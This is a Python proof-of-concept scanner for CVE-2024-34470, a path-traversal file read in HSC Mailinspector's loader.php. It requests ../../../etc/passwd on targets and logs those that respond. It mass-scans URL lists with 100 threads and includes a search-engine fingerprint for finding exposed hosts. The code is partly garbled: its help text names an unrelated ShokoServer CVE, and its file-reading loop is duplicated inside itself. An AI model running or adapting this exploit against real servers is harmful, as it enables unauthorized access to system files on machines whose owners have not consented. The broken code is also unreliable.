#HSC Mailinspector loader.php 任意文件读取漏洞(CVE-2024-34470)
#body="mailinspector/public"
import requests,sys,argparse,time
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    parser = argparse.ArgumentParser(description="ShokoServer /api/Image/withpath/ 任意文件读取漏洞(CVE-2023-43662)")

    parser.add_argument('-u','--url',dest='url',type=str,help='please input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list = []
                with open(args.file,'r',encoding='utf-8') as f:
                    for line in f.readlines():
                        url_list.append(line.strip())
                    mp = Pool(100)
                    mp.map(poc,url_list)
                    mp.close()
                    mp.join()
    else:
        print(f'Usage:{sys.argv[0]} -h or --help')

def poc(target):
    payload = '/mailinspector/public/loader.php?path=../../../../../../../etc/passwd'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive',
    }

    try:
        res1 = requests.get(target + payload, headers=headers, verify=False, timeout=6)
        if 'root' in res1.text:
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
    except Exception as e:
        print(e)


# 程序入口
if __name__ == '__main__':
    main()